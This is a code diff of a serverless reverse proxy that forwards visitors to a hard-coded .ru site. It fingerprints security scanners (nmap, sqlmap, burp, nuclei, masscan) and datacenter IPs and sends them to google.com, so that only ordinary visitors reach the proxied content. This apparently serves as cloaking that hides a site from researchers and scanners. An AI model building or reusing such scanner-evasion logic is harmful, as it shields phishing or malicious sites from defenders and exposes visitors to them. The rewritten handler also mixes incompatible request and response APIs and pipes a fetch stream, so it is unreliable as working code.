@@ -1,8 +1,9 @@
 const BASE_URL = "https://europolus.ru/ar";
 
+// In-memory rate limiting storage
 let rateMap = {};
-const RATE_LIMIT_PERIOD = 60000; 
-const RATE_LIMIT_MAX = 60; 
+const RATE_LIMIT_PERIOD = 60000;
+const RATE_LIMIT_MAX = 60;
 
 const BAD_AGENTS = [
   "nmap", "sqlmap", "burp", "nuclei", "masscan", "fping", "zerotrace",
@@ -75,11 +76,19 @@ function getProxyHeaders(headers) {
   return newHeaders;
 }
 
-export default async function handler(req) {
+export default async function handler(req, res) {
   const url = new URL(req.url);
   
+  // Fix path: Handle root (/) or api paths
+  let path = url.pathname;
+  if (path === '/') path = '';
+  
+  const targetUrl = BASE_URL + path + url.search;
+
+  // 1. Get Client IP
   const clientIp = req.headers.get('x-forwarded-for') || req.headers.get('x-real-ip') || '0.0.0.0';
   
+  // 2. Bot Score Check
   const ua = req.headers.get('user-agent') || '';
   const ipScore = isDatacenterIp(clientIp) ? 3 : 0;
   const agentScore = isBadAgent(ua) ? 2 : 0;
@@ -89,30 +98,30 @@ export default async function handler(req) {
   const botScore = ipScore + agentScore + cookieScore + queryScore;
   
   if (botScore >= 5) {
-    return new Response('Redirecting...', { status: 302, headers: { Location: 'https://google.com' } });
+    return res.redirect('https://google.com');
   }
   
+  // 3. Cookie Challenge
   const cookie = req.headers.get('cookie') || '';
   if (!cookie.includes('hv') && !url.searchParams.has('c')) {
-    return new Response(getChallengePage(), { headers: { 'Content-Type': 'text/html' } });
+    return res.send(getChallengePage());
   }
   
+  // 4. Rate Limit
   if (isRateLimited(clientIp)) {
-    return new Response('Too many requests', { status: 429 });
+    return res.status(429).send('Too many requests');
   }
   
-  const targetUrl = BASE_URL + req.url.slice("/api".length);
-  
+  // 5. Proxy to Backend
   const response = await fetch(targetUrl, {
     method: req.method,
     headers: getProxyHeaders(req.headers),
     body: req.body
   });
   
-  const newResponse = new Response(response.body, {
-    status: response.status,
-    headers: response.headers
-  });
+  // 6. Return Response
+  res.status(response.status);
+  response.headers.forEach((value, key) => res.setHeader(key, value));
   
-  return newResponse;
+  return response.body.pipe(res);
 }
